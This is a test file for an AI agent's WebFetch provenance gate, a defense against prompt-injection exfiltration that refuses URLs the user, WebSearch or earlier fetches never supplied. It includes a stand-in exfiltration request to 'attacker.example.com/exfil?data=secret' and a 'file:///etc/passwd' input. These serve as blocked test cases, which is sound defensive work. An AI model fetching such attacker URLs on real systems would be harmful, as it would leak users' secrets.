import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { beforeEach, test } from "node:test";

/**
 * T2-2 WebFetch URL 溯源闸门验收（specs/error-taxonomy-injection-defense.md R5 + 场景 7）：
 * - 归一化与 URL 提取的纯函数语义；
 * - 历史扫描入集规则：真实用户消息 / WebSearch 结果 / 既往 WebFetch 输入与结果入集，
 *   assistant 文本、其他工具输出、synthetic notice、失败调用的输入不入集；
 * - 账本即时记账与命中；
 * - handler 级：未见过的 URL 被拦（error tool result 含「写进结论/不要重试」指引），
 *   预批面与账本/历史命中的 URL 过闸（以缺 HttpClientPort 的配置错误证明已过闸门）；
 * - 接线钉住：闸门先于缓存与网络、重定向目标与结果 URL 即时入集。
 */

const {
  normalizeProvenanceUrl,
  extractHttpUrls,
  extractProvenanceUrlsFromMessages,
  noteWebFetchProvenanceUrls,
  isWebFetchUrlInProvenanceLedger,
  resolveWebFetchProvenance,
  clearWebFetchProvenanceForTests,
} = await import("../packages/core/src/tool/handlers/webfetch-provenance.ts");
const { webFetchToolEntry, clearWebFetchCacheForTests } = await import(
  "../packages/core/src/tool/handlers/webfetch.ts"
);
const { isWebFetchPreapprovedUrl } = await import(
  "../packages/core/src/tool/webfetch-preapproved.ts"
);

const root = new URL("../", import.meta.url);
const read = (path) =>
  readFile(new URL(path, root), "utf8").then((text) => text.replace(/\r\n/g, "\n"));

beforeEach(() => {
  clearWebFetchProvenanceForTests();
  clearWebFetchCacheForTests();
});

const userText = (text, extra = {}) => ({
  info: { role: "user" },
  parts: [{ type: "text", text, ...extra }],
});
const assistantText = (text) => ({
  info: { role: "assistant" },
  parts: [{ type: "text", text }],
});
const toolPart = (tool, state) => ({
  info: { role: "assistant" },
  parts: [{ type: "tool", tool, callID: "c1", state }],
});
const completed = (input, output) => ({
  status: "completed",
  input,
  output,
  title: "t",
  metadata: {},
  time: { start: 0, end: 1 },
});

test("(场景7/R5) URL 归一化：http→https、host 小写、去 fragment、query 精确保留", () => {
  assert.equal(
    normalizeProvenanceUrl("http://Example.COM/path?x=1#frag"),
    "https://example.com/path?x=1",
  );
  assert.equal(normalizeProvenanceUrl("https://example.com/a"), "https://example.com/a");
  // query 是外传通道：不同 query 不是同一 URL；
  assert.notEqual(
    normalizeProvenanceUrl("https://example.com/a?q=1"),
    normalizeProvenanceUrl("https://example.com/a?q=2"),
  );
  // 非 http(s) 与非法值拒绝：
  assert.equal(normalizeProvenanceUrl("file:///etc/passwd"), undefined);
  assert.equal(normalizeProvenanceUrl("ftp://example.com"), undefined);
  assert.equal(normalizeProvenanceUrl("not a url"), undefined);
});

test("(场景7/R5) 文本 URL 提取：尾部标点剥掉、多 URL 全收", () => {
  const urls = extractHttpUrls(
    "see https://a.example.com/x. also (http://b.example.com/y) and https://c.example.com/z?q=1, done",
  );
  assert.deepEqual(
    [...urls].sort(),
    [
      "https://a.example.com/x",
      "https://b.example.com/y",
      "https://c.example.com/z?q=1",
    ].sort(),
  );
});

test("(场景7/R5) 历史扫描入集规则：三个来源入集，自我授权通道全部排除", () => {
  const messages = [
    // 来源 1：真实用户消息；
    userText("please fetch https://user.example.com/doc"),
    // 排除：synthetic notice（harness 再注入的模型产出，如后台任务通知）；
    userText("notification body with https://synthetic.example.com/n", { synthetic: true }),
    // 排除：assistant 文本（模型复述被注入 URL 不能自我授权）；
    assistantText("I will fetch https://hallucinated.example.com/x"),
    // 来源 2：WebSearch 已完成结果；
    toolPart("WebSearch", completed({ query: "q" }, '{"sources":[{"url":"https://search.example.com/r"}]}')),
    toolPart("web_search", completed({ query: "q" }, "plain text https://provider.example.com/p")),
    // 来源 3：既往 WebFetch 的输入 URL 与结果文本（finalUrl / 重定向目标 / 引用链接）；
    toolPart(
      "WebFetch",
      completed({ url: "https://fetched.example.com/a" }, "answer cites https://fetched.example.com/link and final https://fetched.example.com/final"),
    ),
    // 排除：其他工具输出（Bash/Read 里的 URL 不入集）；
    toolPart("Bash", completed({ command: "curl x" }, "https://bashout.example.com/b")),
    // 排除：失败调用的输入（被闸门拦下的 URL 不能借 error state 自我授权）；
    toolPart("WebFetch", {
      status: "error",
      input: { url: "https://blocked.example.com/retry" },
      error: "webfetch_unprovenanced_url",
      time: { start: 0, end: 1 },
    }),
  ];
  const urls = extractProvenanceUrlsFromMessages(messages);
  for (const expected of [
    "https://user.example.com/doc",
    "https://search.example.com/r",
    "https://provider.example.com/p",
    "https://fetched.example.com/a",
    "https://fetched.example.com/link",
    "https://fetched.example.com/final",
  ]) {
    assert.ok(urls.has(expected), `应入集而缺失：${expected}`);
  }
  for (const excluded of [
    "https://synthetic.example.com/n",
    "https://hallucinated.example.com/x",
    "https://bashout.example.com/b",
    "https://blocked.example.com/retry",
  ]) {
    assert.ok(!urls.has(excluded), `不应入集却出现：${excluded}`);
  }
});

test("(场景7/R5) 账本：即时记账、归一化命中、resolve 回填历史扫描结果", async () => {
  const sessionId = "sess_prov_ledger";
  noteWebFetchProvenanceUrls(sessionId, ["http://Noted.Example.com/path#frag"]);
  assert.equal(isWebFetchUrlInProvenanceLedger(sessionId, "https://noted.example.com/path"), true);
  assert.equal(isWebFetchUrlInProvenanceLedger(sessionId, "https://noted.example.com/other"), false);

  // 历史扫描命中并回填账本（第二次判定不再依赖 sessionStore）：
  const sessionStore = {
    messages: async () => [userText("go https://history.example.com/h")],
  };
  const first = await resolveWebFetchProvenance({
    sessionId,
    sessionStore,
    url: "https://history.example.com/h",
  });
  assert.deepEqual(first, { checked: true, provenanced: true });
  assert.equal(isWebFetchUrlInProvenanceLedger(sessionId, "https://history.example.com/h"), true);

  const missed = await resolveWebFetchProvenance({
    sessionId,
    sessionStore,
    url: "https://never-seen.example.com/x",
  });
  assert.deepEqual(missed, { checked: true, provenanced: false });

  // sessionStore 缺席（测试桩/旧宿主）：跳过闸门，既有行为不变；
  const skipped = await resolveWebFetchProvenance({
    sessionId: "sess_prov_no_store",
    url: "https://whatever.example.com/y",
  });
  assert.deepEqual(skipped, { checked: false, provenanced: true });
});

function makeHandlerContext(sessionId, sessionStore) {
  return {
    toolCallId: "call_prov_1",
    traceId: "trace_prov_1",
    abortSignal: new AbortController().signal,
    sessionId,
    ...(sessionStore ? { sessionStore } : {}),
    workingDirectory: tmpdir(),
    workspaceRoot: tmpdir(),
  };
}

test("(场景7/R5) handler：未见过的 URL 被拦，error tool result 含「写进结论/不要重试」指引", async () => {
  const context = makeHandlerContext("sess_prov_blocked", { messages: async () => [] });
  await assert.rejects(
    webFetchToolEntry.handler(
      { url: "https://attacker.example.com/exfil?data=secret", prompt: "summarize" },
      context,
    ),
    (error) => {
      assert.equal(error.context?.webFetchCode, "webfetch_unprovenanced_url");
      assert.equal(error.retryable, false, "被拦 URL 必须不可重试（重试必失败）");
      assert.match(error.message, /Retrying it will keep failing/);
      assert.match(error.message, /conclusion/);
      assert.equal(error.context?.provenanceChecked, true);
      return true;
    },
  );
  // 仅 assistant 文本见过的 URL 同样被拦（自我授权通道关闭）：
  const context2 = makeHandlerContext("sess_prov_blocked2", {
    messages: async () => [assistantText("fetch https://relay.example.com/x now")],
  });
  await assert.rejects(
    webFetchToolEntry.handler(
      { url: "https://relay.example.com/x", prompt: "summarize" },
      context2,
    ),
    (error) => {
      assert.equal(error.context?.webFetchCode, "webfetch_unprovenanced_url");
      return true;
    },
  );
});

test("(场景7/R5) handler：用户消息见过的 URL 过闸（走到网络层配置错误，而非溯源拒绝）", async () => {
  const context = makeHandlerContext("sess_prov_allowed", {
    messages: async () => [userText("see https://allowed.example.com/page for details")],
  });
  await assert.rejects(
    webFetchToolEntry.handler(
      { url: "https://allowed.example.com/page", prompt: "summarize" },
      context,
    ),
    (error) => {
      // 过闸后缺 HttpClientPort：证明闸门放行、失败发生在网络装配层。
      assert.notEqual(error.context?.webFetchCode, "webfetch_unprovenanced_url");
      assert.match(error.message, /HttpClientPort is not configured/);
      return true;
    },
  );
});

test("(场景7/R5) handler：预批面独立放行，不经账本/历史（与溯源集合并为允许集）", async () => {
  assert.equal(isWebFetchPreapprovedUrl("https://nodejs.org/en/docs"), true);
  const context = makeHandlerContext("sess_prov_preapproved", { messages: async () => [] });
  await assert.rejects(
    webFetchToolEntry.handler(
      { url: "https://nodejs.org/en/docs", prompt: "summarize" },
      context,
    ),
    (error) => {
      assert.notEqual(error.context?.webFetchCode, "webfetch_unprovenanced_url");
      assert.match(error.message, /HttpClientPort is not configured/);
      return true;
    },
  );
});

test("(场景7/R5) 接线钉住：闸门先于缓存与网络，重定向目标与结果 URL 即时入集", async () => {
  const handler = await read("packages/core/src/tool/handlers/webfetch.ts");
  const gateIdx = handler.indexOf("resolveWebFetchProvenance({");
  const cacheIdx = handler.indexOf("getWebFetchCache(cacheKey)");
  const fetchIdx = handler.indexOf("fetchFreshContent({");
  assert.ok(gateIdx > 0, "handler 未接溯源闸门");
  assert.ok(gateIdx < cacheIdx, "闸门必须先于缓存查询");
  assert.ok(gateIdx < fetchIdx, "闸门必须先于网络抓取");
  // 预批面合并：闸门只对非预批 URL 生效；
  assert.ok(
    /if \(!isWebFetchPreapprovedUrl\(parsed\.url\)\)/.test(handler),
    "闸门未与预批面合并（预批 URL 应直接放行）",
  );
  // 放行即记账 + 重定向目标入集 + 结果 URL 入集：
  assert.ok(handler.includes("noteWebFetchProvenanceUrls(context.sessionId, [parsed.url, normalizedUrl])"));
  assert.ok(
    handler.includes("noteWebFetchProvenanceUrls(context.sessionId, [fetched.redirectUrl])"),
    "跨主机重定向目标未即时入集（同轮重抓会被误拦）",
  );
  assert.ok(
    /noteWebFetchProvenanceUrls\(context\.sessionId, \[\s*fetched\.finalUrl,\s*\.\.\.extractHttpUrls\(processing\.result\)/.test(
      handler,
    ),
    "finalUrl 与结果文本 URL 未入集",
  );
  // 描述层预告 + 拒绝码注册：
  assert.match(
    handler,
    /provenance gate|has not appeared in any user message, WebSearch result, or previous WebFetch result/,
  );
  const errors = await read("packages/core/src/tool/handlers/webfetch-errors.ts");
  assert.ok(errors.includes('UnprovenancedUrl: "webfetch_unprovenanced_url"'));
});
